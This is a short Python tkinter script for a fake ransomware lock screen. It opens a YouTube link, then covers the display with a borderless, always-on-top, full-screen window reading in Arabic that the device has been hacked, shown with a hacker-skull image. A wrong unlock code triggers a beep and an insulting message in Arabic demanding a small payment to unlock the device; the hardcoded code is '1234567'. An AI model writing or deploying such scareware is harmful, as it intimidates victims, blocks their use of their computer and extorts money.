import tkinter as tk
from PIL import Image , ImageTk
import winsound
from tkinter import messagebox
import threading
import webbrowser
import time
root = tk.Tk()

webbrowser.open("https://youtu.be/YAFUyPp_238?si=P5uLn1ZGofK6G8Oj")

time.sleep(7)
def clos():
    root.destroy()
    
def button():
    key = "1234567"
    if entry.get() == key:
        clos()
    else:
        winsound.Beep(1000 , 2000)
        messagebox.showerror("تم تشفير وقفل الجهاز" , """  fuck you 🖕 
                            ابعت ال 5ج الي عليك يروح امك عشان افتحلك الجهاز""" )




root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight( )}")
root.overrideredirect(True)

root.attributes("-topmost" , True)

tk.Label(root , text="  تم تهكير جهازك  ").pack()

entry = tk.Entry(root ,width=50 ,bd=0)
entry.pack(pady=20)


b = tk.Button(root , text=" الدخول الى النظام ",command=button).pack()
root.config(background="black")

img_path = "dark-hooded-hacker-skull-vector-44777540.avif"
img = Image.open(img_path)
photo = ImageTk.PhotoImage(img)

tk.Label(root, image=photo, borderwidth=0,highlightthickness=0 ).pack()


threading.Thread(target=button).start



root.mainloop()


 
